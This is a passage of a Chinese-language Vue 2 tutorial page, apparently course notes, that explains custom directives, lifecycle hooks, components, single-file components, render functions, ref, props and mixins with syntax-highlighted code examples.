<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">&gt;</span></span>当前的n值是:{{n}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>n++<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>点我n+1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><h3 id="_6-v-pre指令"><a href="#_6-v-pre指令" class="header-anchor">#</a> 6，v-pre指令</h3> <p>1.跳过其所在节点的编译过程。</p> <p>2.可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。</p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span> <span class="token attr-name">v-pre</span><span class="token punctuation">&gt;</span></span>Vue其实很简单<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><h2 id="五-自定义指令"><a href="#五-自定义指令" class="header-anchor">#</a> 五，自定义指令</h2> <p>一、定义语法：</p> <p>​                  (1).局部指令：</p> <p>​                        new Vue({                                                         new Vue({</p> <p>​                          directives:{指令名:配置对象}           或              directives{指令名:回调函数}</p> <p>​                        })                                                                               })</p> <p>​                  (2).全局指令：</p> <p>​                          Vue.directive(指令名,配置对象) 或  Vue.directive(指令名,回调函数)</p> <p>二、配置对象中常用的3个回调：</p> <p>​                  (1).bind：指令与元素成功绑定时调用。</p> <p>​                  (2).inserted：指令所在元素被插入页面时调用。</p> <p>​                  (3).update：指令所在模板结构被重新解析时调用。</p> <p>三、备注：</p> <p>​                  1.指令定义时不加v-，但使用时要加v-；</p> <p>​                  2.指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。</p> <h3 id="_1-函数式"><a href="#_1-函数式" class="header-anchor">#</a> 1，函数式</h3> <p>定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。</p> <p>使用位置</p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token comment">&lt;!--n为data中的数据--&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">v-big</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>n<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>定义</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">//与data同级</span>
directives<span class="token operator">:</span><span class="token punctuation">{</span>
  <span class="token function">big</span><span class="token punctuation">(</span><span class="token parameter">element<span class="token punctuation">,</span>binding</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'big'</span><span class="token punctuation">,</span><span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token comment">//注意此处的this是window</span>
	<span class="token comment">// 这里的element为span元素，binding指令信息</span>
	element<span class="token punctuation">.</span>innerText <span class="token operator">=</span> binding<span class="token punctuation">.</span>value <span class="token operator">*</span> <span class="token number">10</span>
       <span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span>
</code></pre></div><h3 id="_2-对象式"><a href="#_2-对象式" class="header-anchor">#</a> 2，对象式</h3> <p>定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。</p> <p>使用位置</p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span> <span class="token attr-name"><span class="token namespace">v-fbind:</span>value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>n<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>定义</p> <div class="language-js extra-class"><pre class="language-js"><code>directives<span class="token operator">:</span><span class="token punctuation">{</span>
<span class="token comment">//使用函数式时默认为bind与update方法(一致的)</span>
fbind<span class="token operator">:</span><span class="token punctuation">{</span>
    <span class="token comment">//指令与元素成功绑定时（一上来）</span>
    <span class="token function">bind</span><span class="token punctuation">(</span><span class="token parameter">element<span class="token punctuation">,</span>binding</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        element<span class="token punctuation">.</span>value <span class="token operator">=</span> binding<span class="token punctuation">.</span>value
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token comment">//指令所在元素被插入页面时</span>
    <span class="token function">inserted</span><span class="token punctuation">(</span><span class="token parameter">element<span class="token punctuation">,</span>binding</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        element<span class="token punctuation">.</span><span class="token function">focus</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token comment">//指令所在的模板被重新解析时</span>
    <span class="token function">update</span><span class="token punctuation">(</span><span class="token parameter">element<span class="token punctuation">,</span>binding</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        element<span class="token punctuation">.</span>value <span class="token operator">=</span> binding<span class="token punctuation">.</span>value
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><h3 id="_3-全局配置"><a href="#_3-全局配置" class="header-anchor">#</a> 3，全局配置</h3> <p><strong>函数式</strong></p> <div class="language-js extra-class"><pre class="language-js"><code>Vue<span class="token punctuation">.</span><span class="token function">directive</span><span class="token punctuation">(</span><span class="token string">'big'</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">element<span class="token punctuation">,</span>binding</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    element<span class="token punctuation">.</span>innerText <span class="token operator">=</span> binding<span class="token punctuation">.</span>value <span class="token operator">*</span> <span class="token number">10</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><p><strong>对象式</strong></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">//定义全局指令</span>
Vue<span class="token punctuation">.</span><span class="token function">directive</span><span class="token punctuation">(</span><span class="token string">'fbind'</span><span class="token punctuation">,</span><span class="token punctuation">{</span>
    <span class="token comment">//指令与元素成功绑定时（一上来）</span>
    <span class="token function">bind</span><span class="token punctuation">(</span><span class="token parameter">element<span class="token punctuation">,</span>binding</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        element<span class="token punctuation">.</span>value <span class="token operator">=</span> binding<span class="token punctuation">.</span>value
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token comment">//指令所在元素被插入页面时</span>
    <span class="token function">inserted</span><span class="token punctuation">(</span><span class="token parameter">element<span class="token punctuation">,</span>binding</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        element<span class="token punctuation">.</span><span class="token function">focus</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token comment">//指令所在的模板被重新解析时</span>
    <span class="token function">update</span><span class="token punctuation">(</span><span class="token parameter">element<span class="token punctuation">,</span>binding</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        element<span class="token punctuation">.</span>value <span class="token operator">=</span> binding<span class="token punctuation">.</span>value
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><h2 id="六-生命周期"><a href="#六-生命周期" class="header-anchor">#</a> 六，生命周期</h2> <h3 id="_1-原理图"><a href="#_1-原理图" class="header-anchor">#</a> <strong>1，原理图</strong></h3> <p><img src="https://raw.githubusercontent.com/jack110959/pictures/main/img%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.png" alt="生命周期"></p> <h3 id="_2-四对钩子函数"><a href="#_2-四对钩子函数" class="header-anchor">#</a> <strong>2，四对钩子函数</strong></h3> <div class="language-js extra-class"><pre class="language-js"><code>            <span class="token function">beforeCreate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
				console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'beforeCreate'</span><span class="token punctuation">)</span>
			<span class="token punctuation">}</span><span class="token punctuation">,</span>
            <span class="token comment">//数据监测，数据代理</span>
			<span class="token function">created</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
				console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'created'</span><span class="token punctuation">)</span>
			<span class="token punctuation">}</span><span class="token punctuation">,</span>
                
			<span class="token function">beforeMount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
				console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'beforeMount'</span><span class="token punctuation">)</span>
			<span class="token punctuation">}</span><span class="token punctuation">,</span>
            <span class="token comment">//将内存中的虚拟dom转换为真实dom，插入页面</span>
			<span class="token function">mounted</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
				console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'mounted'</span><span class="token punctuation">)</span>
			<span class="token punctuation">}</span><span class="token punctuation">,</span>
                
			<span class="token function">beforeUpdate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
				console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'beforeUpdate'</span><span class="token punctuation">)</span>
			<span class="token punctuation">}</span><span class="token punctuation">,</span>
            <span class="token comment">//页面数据更新</span>
			<span class="token function">updated</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
				console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'updated'</span><span class="token punctuation">)</span>
			<span class="token punctuation">}</span><span class="token punctuation">,</span>
                
			<span class="token function">beforeDestroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
				console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'beforeDestroy'</span><span class="token punctuation">)</span>
			<span class="token punctuation">}</span><span class="token punctuation">,</span>
            <span class="token comment">//vm销毁</span>
			<span class="token function">destroyed</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
				console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'destroyed'</span><span class="token punctuation">)</span>
			<span class="token punctuation">}</span><span class="token punctuation">,</span>
</code></pre></div><h3 id="_3-总结"><a href="#_3-总结" class="header-anchor">#</a> 3，总结</h3> <p>常用的生命周期钩子：</p> <p>​            1.mounted: 发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】。</p> <p>​            2.beforeDestroy: 清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】。</p> <p>​        关于销毁Vue实例</p> <p>​            1.销毁后借助Vue开发者工具看不到任何信息。</p> <p>​            2.销毁后自定义事件会失效，但原生DOM事件依然有效。</p> <p>​            3.一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了。</p> <h2 id="七-非单文件组件"><a href="#七-非单文件组件" class="header-anchor">#</a> 七，非单文件组件</h2> <p>Vue中使用组件的三大步骤：</p> <p>​          一、定义组件(创建组件)</p> <p>​          二、注册组件</p> <p>​          三、使用组件(写组件标签)</p> <p>​      一、如何定义一个组件？</p> <p>​            使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有点区别；</p> <p>​            区别如下：</p> <p>​                1.el不要写，为什么？ ——— 最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。</p> <p>​                2.data必须写成函数，为什么？ ———— 避免组件被复用时，数据存在引用关系。</p> <p>​            备注：使用template可以配置组件结构。</p> <p>​      二、如何注册组件？</p> <p>​              1.局部注册：靠new Vue的时候传入components选项</p> <p>​              2.全局注册：靠Vue.component('组件名',组件)</p> <p>​      三、编写组件标签：</p> <p>​              <school></school></p> <h3 id="_1-创建组件"><a href="#_1-创建组件" class="header-anchor">#</a> 1，创建组件</h3> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">const</span> school <span class="token operator">=</span> Vue<span class="token punctuation">.</span><span class="token function">extend</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
			template<span class="token operator">:</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
				&lt;div class=&quot;demo&quot;&gt;
					&lt;h2&gt;学校名称：{{schoolName}}&lt;/h2&gt;
					&lt;h2&gt;学校地址：{{address}}&lt;/h2&gt;
					&lt;button @click=&quot;showName&quot;&gt;点我提示学校名&lt;/button&gt;	
				&lt;/div&gt;
			</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
			<span class="token comment">// el:'#root', //组件定义时，一定不要写el配置项，因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器。</span>
			<span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
				<span class="token keyword">return</span> <span class="token punctuation">{</span>
					schoolName<span class="token operator">:</span><span class="token string">'尚硅谷'</span><span class="token punctuation">,</span>
					address<span class="token operator">:</span><span class="token string">'北京昌平'</span>
				<span class="token punctuation">}</span>
			<span class="token punctuation">}</span><span class="token punctuation">,</span>
			methods<span class="token operator">:</span> <span class="token punctuation">{</span>
				<span class="token function">showName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
					<span class="token function">alert</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>schoolName<span class="token punctuation">)</span>
				<span class="token punctuation">}</span>
			<span class="token punctuation">}</span><span class="token punctuation">,</span>
		<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><h3 id="_2-注册组件"><a href="#_2-注册组件" class="header-anchor">#</a> 2，注册组件</h3> <p>局部注册</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    el<span class="token operator">:</span><span class="token string">'#root'</span><span class="token punctuation">,</span>
    data<span class="token operator">:</span><span class="token punctuation">{</span>
    msg<span class="token operator">:</span><span class="token string">'你好啊！'</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token comment">//第二步：注册组件（局部注册）</span>
    components<span class="token operator">:</span><span class="token punctuation">{</span>
    school
      <span class="token punctuation">}</span>
 <span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><p>全局注册</p> <div class="language-js extra-class"><pre class="language-js"><code>Vue<span class="token punctuation">.</span><span class="token function">component</span><span class="token punctuation">(</span><span class="token string">'school'</span><span class="token punctuation">,</span>school<span class="token punctuation">)</span>
</code></pre></div><h3 id="_3-使用"><a href="#_3-使用" class="header-anchor">#</a> 3，使用</h3> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>school</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>school</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><h3 id="_4-注意点"><a href="#_4-注意点" class="header-anchor">#</a> 4，注意点</h3> <p>1.关于组件名:</p> <p>​                一个单词组成：</p> <p>​                      第一种写法(首字母小写)：school</p> <p>​                      第二种写法(首字母大写)：School</p> <p>​                多个单词组成：</p> <p>​                      第一种写法(kebab-case命名)：my-school</p> <p>​                      第二种写法(CamelCase命名)：MySchool (需要Vue脚手架支持)</p> <p>​                备注：</p> <p>​                    (1).组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行。</p> <p>​                    (2).可以使用name配置项指定组件在开发者工具中呈现的名字。</p> <p>​          2.关于组件标签:</p> <p>​                第一种写法：<school></school></p> <p>​                第二种写法：<school></school></p> <p>​                备注：不用使用脚手架时，<school></school>会导致后续组件不能渲染。</p> <p>​          3.一个简写方式：</p> <p>​                const school = Vue.extend(options) 可简写为：const school = options</p> <h3 id="_5-vuecomponent"><a href="#_5-vuecomponent" class="header-anchor">#</a> 5，VueComponent</h3> <p>1.school组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是Vue.extend生成的。</p> <p>2.我们只需要写<school></school>或<school></school>，Vue解析时会帮我们创建school组件的实例对象，</p> <p>即Vue帮我们执行的：new VueComponent(options)。</p> <p>3.特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent！！！！</p> <p>4.关于<strong>this</strong>指向：</p> <p>​          (1).组件配置中：</p> <p>data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【<strong>VueComponent</strong>实例对象】。</p> <p>​          (2).new Vue(options)配置中：</p> <p>data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【<strong>Vue</strong>实例对象】。</p> <p>5.VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象）。</p> <p>​              Vue的实例对象，以后简称vm。</p> <h3 id="_6-组件的原型"><a href="#_6-组件的原型" class="header-anchor">#</a> 6，组件的原型</h3> <p>1.一个重要的内置关系：VueComponent.prototype.<strong>proto</strong> === Vue.prototype</p> <p>2.为什么要有这个关系：让组件实例对象（vc）可以访问到 Vue原型上的属性、方法。</p> <p><img src="https://github.com/jack110959/pictures/blob/main/imgimage-20210904131457958.png?raw=true" alt="image-20210904131457958"></p> <h2 id="八。单文件组件"><a href="#八。单文件组件" class="header-anchor">#</a> 八。单文件组件</h2> <p>以.vue为后缀的文件，浏览器无法直接运行</p> <p>一个简单的组件格式</p> <div class="language-vue extra-class"><pre class="language-vue"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>demo<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">&gt;</span></span>学校名称：{{name}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">&gt;</span></span>学校地址：{{address}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>showName<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>点我提示学校名<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>	
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
    <span class="token comment">//需要export出去，其他地方才可以import导入使用，一般使用默认暴露</span>
	 <span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span>
		name<span class="token operator">:</span><span class="token string">'School'</span><span class="token punctuation">,</span>
		<span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
			<span class="token keyword">return</span> <span class="token punctuation">{</span>
				name<span class="token operator">:</span><span class="token string">'尚硅谷'</span><span class="token punctuation">,</span>
				address<span class="token operator">:</span><span class="token string">'北京昌平'</span>
			<span class="token punctuation">}</span>
		<span class="token punctuation">}</span><span class="token punctuation">,</span>
		methods<span class="token operator">:</span> <span class="token punctuation">{</span>
			<span class="token function">showName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
				<span class="token function">alert</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span>
			<span class="token punctuation">}</span>
		<span class="token punctuation">}</span><span class="token punctuation">,</span>
	<span class="token punctuation">}</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css">
	<span class="token selector">.demo</span><span class="token punctuation">{</span>
		<span class="token property">background-color</span><span class="token punctuation">:</span> orange<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><h2 id="九-脚手架cli"><a href="#九-脚手架cli" class="header-anchor">#</a> 九，脚手架cli</h2> <h3 id="_1-render函数"><a href="#_1-render函数" class="header-anchor">#</a> 1，render函数</h3> <p>1.vue.js与vue.runtime.xxx.js的区别：</p> <p>​        (1).vue.js是完整版的Vue，包含：核心功能+模板解析器。</p> <p>​        (2).vue.runtime.xxx.js是运行版的Vue，只包含：核心功能；没有模板解析器。</p> <p>2.因为vue.runtime.xxx.js没有模板解析器，所以不能使用template配置项，需要使用</p> <p>​      render函数接收到的createElement函数去指定具体内容。</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">//标准创建vm</span>
<span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
	el<span class="token operator">:</span><span class="token string">'#app'</span><span class="token punctuation">,</span>
	<span class="token function-variable function">render</span><span class="token operator">:</span> <span class="token parameter">h</span> <span class="token operator">=&gt;</span> <span class="token function">h</span><span class="token punctuation">(</span>App<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token comment">//   render(h) {</span>
	<span class="token comment">//	   return h(App)</span>
	<span class="token comment">//   },</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><h3 id="_2-ref"><a href="#_2-ref" class="header-anchor">#</a> 2，ref</h3> <p>vue用来获取元素的一种解决方法</p> <ol><li><p>被用来给元素或子组件注册引用信息（id的替代者）</p></li> <li><p>应用在html标签上获取的是真实DOM元素，应用在组件标签上是组件实例对象（vc）</p></li> <li><p>使用方式：</p></li> <li><p>打标识：<code>&lt;h1 ref=&quot;xxx&quot;&gt;.....&lt;/h1&gt;</code> 或 <code>&lt;School ref=&quot;xxx&quot;&gt;&lt;/School&gt;</code></p></li> <li><p>获取：<code>this.$refs.xxx</code></p></li></ol> <p>示例</p> <div class="language-vue extra-class"><pre class="language-vue"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">v-text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>msg<span class="token punctuation">&quot;</span></span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>title<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>btn<span class="token punctuation">&quot;</span></span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>showDOM<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>点我输出上方的DOM元素<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>School</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>sch<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span>

使用
showDOM(){
  console.log(this.$refs.title) //真实DOM元素
  console.log(this.$refs.btn) //真实DOM元素
  console.log(this.$refs.sch) //School组件的实例对象（vc）
}
</code></pre></div><h3 id="_3-props"><a href="#_3-props" class="header-anchor">#</a> 3，props</h3> <p>1.功能：让组件接收外部传过来的数据</p> <p>2.传递数据：<code>&lt;Demo name=&quot;xxx&quot;/&gt;</code></p> <p>3.接收数据：</p> <ol><li><p>第一种方式（只接收）：<code>props:['name']</code></p></li> <li><p>第二种方式（限制类型）：<code>props:{name:String}</code></p> <p>3.第三种方式（限制类型、限制必要性、指定默认值）：</p></li></ol> <div class="language-js extra-class"><pre class="language-js"><code>props<span class="token operator">:</span><span class="token punctuation">{</span>
    name<span class="token operator">:</span><span class="token punctuation">{</span>
        type<span class="token operator">:</span>String<span class="token punctuation">,</span> <span class="token comment">//类型</span>
        required<span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment">//必要性</span>
        <span class="token keyword">default</span><span class="token operator">:</span><span class="token string">'老王'</span> <span class="token comment">//默认值</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><p>&gt; 备注：props是只读的，Vue底层会监测你对props的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请复制props的内容到data中一份，然后去修改data中的数据。</p> <p>示例</p> <p>父组件中传入，需要注意默认都是字符串格式，如果想传数值类型等需要加冒号。如age</p> <div class="language-vue extra-class"><pre class="language-vue"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Student</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>李四<span class="token punctuation">&quot;</span></span> <span class="token attr-name">sex</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>女<span class="token punctuation">&quot;</span></span> <span class="token attr-name">:age</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>18<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>案例总结</p> <ol><li><p>props适用于：</p> <p>(1).父组件 ==&gt; 子组件 通信</p> <p>(2).子组件 ==&gt; 父组件 通信（要求父先给子一个函数）</p></li> <li><p>使用v-model时要切记：v-model绑定的值不能是props传过来的值，因为props是不可以修改的！</p></li> <li><p>props传过来的若是对象类型的值，修改对象中的属性时Vue不会报错，但不推荐这样做。</p></li></ol> <h3 id="_4-mixin-混入"><a href="#_4-mixin-混入" class="header-anchor">#</a> 4，<strong>mixin(混入)</strong></h3> <p>1.功能：可以把多个组件共用的配置提取成一个混入对象</p> <p>2.使用方式：</p> <p>第一步定义混合：</p> <p>创建一个mixin.js文件来存放</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token punctuation">{</span>
 <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token operator">...</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
 methods<span class="token operator">:</span><span class="token punctuation">{</span><span class="token operator">...</span><span class="token punctuation">.</span><span class="token punctuation">}</span>
 <span class="token operator">...</span><span class="token punctuation">.</span>
<span class="token punctuation">}</span>
</code></pre></div><p>示例</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">export</span> <span class="token keyword">const</span> hunhe <span class="token operator">=</span> <span class="token punctuation">{</span>
	methods<span class="token operator">:</span> <span class="token punctuation">{</span>
		<span class="token function">showName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
			<span class="token function">alert</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span><span class="token punctuation">,</span>
	<span class="token function">mounted</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'你好啊！'</span><span class="token punctuation">)</span>
	<span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span>
